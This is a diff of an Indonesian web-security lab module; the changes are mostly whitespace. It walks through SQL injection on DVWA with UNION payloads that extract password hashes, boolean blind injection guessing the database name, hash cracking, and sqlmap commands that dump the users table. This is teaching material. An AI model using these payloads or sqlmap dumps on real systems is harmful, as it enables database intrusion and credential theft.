@@ -58,49 +58,49 @@ Syntax tersebut digunakan untuk melakukan query ke sebuah tabel Users dalam suat
 > Task: Curi password dari users yang terdapat dalam database DVWA dengan menggunakan sql. Total users dalam database adalah 5 users dengan id dari 1 hingga 5.
 
 Cara: 
-1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux
-    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">
+1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux  
+    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">  
 
-2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`
+2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`  
     <img width="380" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4bd672bf-40d1-4a5d-bd80-a706a7745a66">
 
-3. Kita lakukan login dengan `username: admin` dan `password: password`
+3. Kita lakukan login dengan `username: admin` dan `password: password`  
 
     <img width="793" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/ade9d7b1-f53a-4035-83dc-fdd0c7eca538">
 
-4. Kita set `security level: low`
+4. Kita set `security level: low`  
 
    <img width="478" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/725b04eb-5f97-407f-aac8-b0e50ad975dc">
 
-5. Kita masuk ke tab `SQL Injection`
+5. Kita masuk ke tab `SQL Injection`  
 
    <img width="549" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/d5b47694-f22d-4ac1-a339-3ac96608b603">
 
-6. Saat kita masukkan salah satu id, misal `id = 1`, maka akan terlihat seperti ini:
+6. Saat kita masukkan salah satu id, misal `id = 1`, maka akan terlihat seperti ini:  
     <img width="283" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/f75e7b39-62da-409b-b39d-1b4e65f4aba6">
 
-7. Kita bedah source codenya:
+7. Kita bedah source codenya:  
 
    ![sql_injection](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/a28209da-ad4d-4c26-827e-ac6beb532da2)
 
-* Dari kode tersebut, apapun yang kita inputkan akan masuk menjadi query dan akan diproses. Sebab, isi dari variabel query:
+* Dari kode tersebut, apapun yang kita inputkan akan masuk menjadi query dan akan diproses. Sebab, isi dari variabel query:  
 
   ```
   $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
   ```
-* Untuk mendapatkan password, kita gunakan syntax `union` untuk mengambil password dari `id = 1`
+* Untuk mendapatkan password, kita gunakan syntax `union` untuk mengambil password dari `id = 1`  
 
-  ``` SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT password, null FROM users -- '; ```
+  ``` SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT password, null FROM users -- '; ```  
 
-* Setelah itu, kita masukkan ke text input `User ID`
-  `1' UNION SELECT password, null FROM users -- '; ``` `
+* Setelah itu, kita masukkan ke text input `User ID`  
+  `1' UNION SELECT password, null FROM users -- '; ``` `  
 
-  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu `' UNION SELECT password, null FROM users -- '; `` `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.
+  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu `' UNION SELECT password, null FROM users -- '; `` `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.  
 
-8. Hasil serangan:
+8. Hasil serangan:  
    <img width="398" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/a66c2bd3-32c0-47a5-aacf-245a7c602306">
 
-9. Password tersebut dibuat dengan hashcode sehingga kita dapat generate hashcode tersebut di `crackstation.net`
+9. Password tersebut dibuat dengan hashcode sehingga kita dapat generate hashcode tersebut di `crackstation.net`  
 
     <img width="557" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/caae5d84-6c7f-4565-b203-c8ab648bba77">
 
@@ -109,52 +109,52 @@ Cara:
 > Task: sama seperti pada serangan low
 
 Cara:
-1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`
+1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`  
 
 ![change diff](src/difficulty.png)
 
-2. Buka tab `SQL Injection` dan lihat source nya
->![source](src/source.png)
+2. Buka tab `SQL Injection` dan lihat source nya  
+>![source](src/source.png)  
 >Dapat dilihat bahwa pada bagian pengeksekusian query hampir sama dengan diff low hanya saja pada `$id` tidak ada tanda petik serta pengiriman data menggunakan _POST sehingga query yang akan di inject akan sedikit berbeda
 
-3. Query yang akan di inject berupa:
+3. Query yang akan di inject berupa:  
 
 ```
 1 UNION SELECT first_name, password FROM users
 ```
->karena menggunakan UNION, maka jumlah kolom yang ditampilkan harus sama dengan query sebelumnya
+>karena menggunakan UNION, maka jumlah kolom yang ditampilkan harus sama dengan query sebelumnya  
 >
->query asli: first_name, last_name
+>query asli: first_name, last_name  
 >
->query injeksi: first_name, password
+>query injeksi: first_name, password  
 
-4. Injek query yang sudah disiapkan melalui `inspect`
->Kenapa menggunakan `inspect`? karena field id berupa optian bukan textbox sehingga tidak dapat mengetik secara langsung
+4. Injek query yang sudah disiapkan melalui `inspect`  
+>Kenapa menggunakan `inspect`? karena field id berupa optian bukan textbox sehingga tidak dapat mengetik secara langsung  
 
->![inspect](src/inspect.png)
+>![inspect](src/inspect.png)  
 >tahapan inspect:
 >
->klik kanan, pilih inspect, klik icon kotak-kursor pada bagian pojok kiri atas jendela inspect, lalu klik field option id
+>klik kanan, pilih inspect, klik icon kotak-kursor pada bagian pojok kiri atas jendela inspect, lalu klik field option id  
 
->![query injection](src/injection.png)
+>![query injection](src/injection.png)  
 >letakkan query kedalam value pada salah satu tag option
 
-5. Tekan tombol Submit dan hasilnya akan keluar
+5. Tekan tombol Submit dan hasilnya akan keluar  
 
->![hasil](src/hasil.png)
+>![hasil](src/hasil.png)  
 >hasil injeksi dapat dilihat pada baris data setelah baris pertama (admin/admin)
 >
 >first_name = first_name
 >surname = password
 
-6. Hash yang sudah didapatkan dapat didecrypt seperti pada diff low untuk mendapatkan password sebenarnya
+6. Hash yang sudah didapatkan dapat didecrypt seperti pada diff low untuk mendapatkan password sebenarnya  
 
 
 ## Blind SQL Injection
 
-Blind SQL Injection adalah jenis serangan SQL Injection yang mengajukan pertanyaan-pertanyaan true or false kepada database dan menentukan jawabannya berdasarkan respons aplikasi.
+Blind SQL Injection adalah jenis serangan SQL Injection yang mengajukan pertanyaan-pertanyaan true or false kepada database dan menentukan jawabannya berdasarkan respons aplikasi.  
 
-Berikut adalah beberapa metode dari Blind SQL Injection:
+Berikut adalah beberapa metode dari Blind SQL Injection:  
 
 1. Union Exploitation
 2. Boolean Exploitation
@@ -163,11 +163,11 @@ Berikut adalah beberapa metode dari Blind SQL Injection:
 5. Out of Band Exploitation
 6. Stored Procedure Injection
 
-### Union Exploitation
+### Union Exploitation  
 
 Operasi UNION digunakan dalam SQL Injection untuk menggabungkan hasil dari dua atau lebih query SQL dalam satu hasil yang dikembalikan oleh aplikasi web. Dengan memasukkan UNION SQL yang benar, penyerang dapat mencoba menggabungkan hasil dari query yang dieksekusi dengan hasil dari query tambahan yang mereka tentukan. Hasilnya adalah penyerang dapat melihat data yang seharusnya tidak mereka akses, seperti informasi pengguna, kata sandi, atau data sensitif lainnya yang disimpan dalam database.
 
-Contoh query:
+Contoh query:  
 
 ``` sql
 SELECT Name, Phone, Address FROM Users WHERE Id=$id
@@ -176,7 +176,7 @@ SELECT Name, Phone, Address FROM Users WHERE Id=$id
 -- 1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
 ```
 
-Perlu diingat bahwa kata kunci 'ALL' digunakan untuk menggantikan 'DISTINCT' dan bahwa jumlah kolom dalam kedua bagian query harus sama.
+Perlu diingat bahwa kata kunci 'ALL' digunakan untuk menggantikan 'DISTINCT' dan bahwa jumlah kolom dalam kedua bagian query harus sama.  
 
 ### Boolean Exploitation
 
@@ -261,79 +261,79 @@ $results = DB::select( DB::raw("SELECT * FROM some_table WHERE some_col = :somev
 > Task: Menemukan kode yang tepat sesuai dengan versi dari sql database software melalui blind sql attack. Sebab, biasanya kalau syntax tidak sesuai akan muncul eror
 
 Cara:
-1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux
-    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">
+1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux  
+    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">  
 
-2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`
-    <img width="380" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4bd672bf-40d1-4a5d-bd80-a706a7745a66">
+2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`  
+    <img width="380" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4bd672bf-40d1-4a5d-bd80-a706a7745a66">  
 
-3. Kita lakukan login dengan `username: admin` dan `password: password`
+3. Kita lakukan login dengan `username: admin` dan `password: password`  
 
-    <img width="793" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/ade9d7b1-f53a-4035-83dc-fdd0c7eca538">
+    <img width="793" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/ade9d7b1-f53a-4035-83dc-fdd0c7eca538">  
 
-4. Kita set `security level: low`
+4. Kita set `security level: low`  
 
-    <img width="444" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4c712f9d-0643-48bb-844a-f0fb518db834">
+    <img width="444" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4c712f9d-0643-48bb-844a-f0fb518db834">  
 
 
-5. Kita masuk ke tab `SQL Injection (Blind)`
+5. Kita masuk ke tab `SQL Injection (Blind)`  
 
-   <img width="463" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0dc7f977-d613-4e67-acb3-8ed1fc412b7f">
+   <img width="463" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0dc7f977-d613-4e67-acb3-8ed1fc412b7f">  
 
-6. Kita perhatikan source codenya:
+6. Kita perhatikan source codenya:  
 
-   ![3](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0ac82a61-f377-40fd-831d-0f92e04ba2d5)
+   ![3](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0ac82a61-f377-40fd-831d-0f92e04ba2d5)  
 
 
 * Dari kode tersebut, setelah kita menekan tombol `Submit` maka akan mengambil `ID` dari method `GET` lalu akan mengeksekusi query yang menampilkan `first_name` dan `last_name`.
 
-7. Setelah kita menekan tombol `Submit`, maka alamat url menjadi:
+7. Setelah kita menekan tombol `Submit`, maka alamat url menjadi:  
     > http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
 
 8. Kita akan melakukan beberapa modifikasi dari alamat url tersebut:
    * Kita ingin cek apakah terdapat `User ID: 1` pada database tersebut dengan cara:
      > http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and 1=1 -- -'7&Submit=Submit#  
-         Hasilnya:
-         <img width="459" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/5a44ebe2-d7da-4942-9c60-c52f582826a6">
+         Hasilnya:  
+         <img width="459" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/5a44ebe2-d7da-4942-9c60-c52f582826a6">  
 
      > Url tersebut berarti id=1 dapat dicari apabila nilai 1=1
-     > Apabila nilai 1=0, maka hasilnya salah. Hal tersebut, dibuktikan dengan:
+     > Apabila nilai 1=0, maka hasilnya salah. Hal tersebut, dibuktikan dengan:  
          <img width="460" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c95d6221-bd47-4a31-8740-9e6035bb7c83">
    * Kita ingin mengetahui kata pertama dari data di database itu. Bisa dengan cara modifikasi pada inputan `User ID`, seperti ini:
 
-     > 1' and (select substring(database(), 1, 1))="a" -- -'  
-         <img width="334" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/290a3ccb-db45-48a0-8cf0-6cc6b173879c">  
-         Maka hasilnya:  
-         <img width="467" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/7992d310-eb37-4dc4-9214-f9f16244a71a">
+     > 1' and (select substring(database(), 1, 1))="a" -- -'      
+         <img width="334" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/290a3ccb-db45-48a0-8cf0-6cc6b173879c">    
+         Maka hasilnya:    
+         <img width="467" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/7992d310-eb37-4dc4-9214-f9f16244a71a">  
 
-     > Lalu saat kita ubah jadi huruf lain, dengan:
-         1' and (select substring(database(), 1, 1))="d" -- -'  
+     > Lalu saat kita ubah jadi huruf lain, dengan:  
+         1' and (select substring(database(), 1, 1))="d" -- -'    
          <img width="338" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/f70056ea-4350-4160-917d-394320fba5a0">    
-         Maka hasilnya:  
+         Maka hasilnya:    
             <img width="336" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/30474fef-ab7b-4701-af26-d5b60f5c308e">  
-         Artinya: kata pertama dari id=1 pada database adalah `d`
-    * Kita ingin mengetahui kata kedua dari data di database. Bisa dengan cara modifikasi pada inputan `User ID`, seperti ini:  
-      > 1' and (select substring(database(), 2, 1))="a" -- -'
-          <img width="342" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/d8e2ea18-daae-4669-89a1-d8f30d9dac22">
+         Artinya: kata pertama dari id=1 pada database adalah `d`  
+    * Kita ingin mengetahui kata kedua dari data di database. Bisa dengan cara modifikasi pada inputan `User ID`, seperti ini:   
+      > 1' and (select substring(database(), 2, 1))="a" -- -'  
+          <img width="342" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/d8e2ea18-daae-4669-89a1-d8f30d9dac22">  
       > Kita tebak dari a hingga z, mana huruf yang cocok. Jika cocok, maka huruf tersebut merupakan kata kedua dari User ID tersebut. 
 
 ### Serangan di DVWA dengan security level medium
-1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`
+1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`  
 
 ![change diff](src/blind_diff.png)
 
-2. Buka tab `SQL Injection (Blind)` kemudian inspect, pilih tab network, lalu klik submit
+2. Buka tab `SQL Injection (Blind)` kemudian inspect, pilih tab network, lalu klik submit  
 
 ![network](src/blind_network.png)
 
 3. Pilih data teratas dan catat cookies dan raw requestnya
->Pilih tab `Cookies` pada bagian bawah untuk melihat cookies yang ada
+>Pilih tab `Cookies` pada bagian bawah untuk melihat cookies yang ada  
 >![cookies](src/blind_cookies.png)
 
->Pilih tab `Request` pada bagian bawah lalu tekan togle `Raw` untuk melihat raw request yang dikirimkan
+>Pilih tab `Request` pada bagian bawah lalu tekan togle `Raw` untuk melihat raw request yang dikirimkan  
 >![request](src/blind_request.png)
 
->catat dengan format yang sesuai pada gambar dibawah
+>catat dengan format yang sesuai pada gambar dibawah  
 >![note](src/blind_note.png)
 
 4. Buka terminal dan jalankan command sqlmap berikut:
@@ -347,7 +347,7 @@ sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" --dbms --batch
 >`[cookies]` = cookies yang telah di catat sesuai format
 >
 >`[request]` = raw request yang telah dicatat sesuai format 
-
+  
 ![sqlmap1](src/blind_sqlmap1.png)
 Didapatkan daftar database yang ada pada server
 ```
@@ -359,7 +359,7 @@ Didapatkan daftar database yang ada pada server
 ```
 sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa --tables --batch
 ```
->command di atas akan menampilkan tabel yang ada dalam database dvwa
+>command di atas akan menampilkan tabel yang ada dalam database dvwa  
 
 ![sqlmap2](src/blind_sqlmap2.png)
 
@@ -367,7 +367,7 @@ sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa --tables --bat
 ```
 sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa -T users --dump --batch
 ```
->--dump digunakan untuk menampilkan semua data didalam sebuah tabel
+>--dump digunakan untuk menampilkan semua data didalam sebuah tabel  
 
 ![sqlmap3](src/blind_sqlmap3.png)
 >karena enkripsi password yang sederhana menggunakan `md5`, sqlmap secara otomatis mendekripsi semua password yang ada
